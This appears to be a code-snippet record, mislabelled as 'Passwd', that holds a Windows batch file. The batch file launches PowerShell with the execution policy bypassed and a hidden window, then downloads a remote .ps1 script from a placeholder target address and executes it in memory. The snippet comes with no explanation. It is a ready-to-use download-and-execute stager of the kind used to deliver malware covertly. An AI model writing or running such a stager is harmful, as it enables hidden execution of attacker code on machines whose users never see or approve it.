---
id: 71b7f95a-677a-4533-9c97-ad0e6a76d9b3
type: code
language: Passwd
verified: false
created_at: '2020-04-04T01:00:40.825269+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 71b7f95a

**Language**: Passwd

```passwd
@ECHO OFF
powershell.exe -ep bypass -noprofile -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_FILENAME.ps1')"
```


